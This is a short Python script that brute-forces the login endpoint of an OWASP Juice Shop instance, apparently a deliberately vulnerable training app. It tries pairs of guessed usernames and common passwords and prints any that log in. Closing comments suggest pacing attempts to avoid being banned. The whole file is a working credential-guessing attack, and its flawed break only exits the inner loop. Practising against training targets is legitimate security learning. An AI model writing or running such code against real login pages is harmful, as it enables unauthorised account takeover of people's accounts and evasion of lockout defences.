import requests

url = "https://juice-shop.herokuapp.com/rest/user/login"

users = ["admin", "user", "test"]
passwords = ["admin", "password", "123456"]

for user in users:
    for password in passwords:
        data = {"email": user, "password": password}

        try:
            response = requests.post(url, json=data)
        
            if response.status_code == 200:
                print(f"Login successful with user: {user} and password: {password}")
                break
            else:
                print(f"Failed login attempt with user: {user} and password: {password}")
        except requests.exceptions.RequestException as e:
            print(f"Exception occurred: {e}")

# The code now includes error handling for failed requests
# Implement login rate limiting to avoid getting banned due to too many login attempts
# Use session management to maintain cookies and data across requests for efficiency and to maintain state.
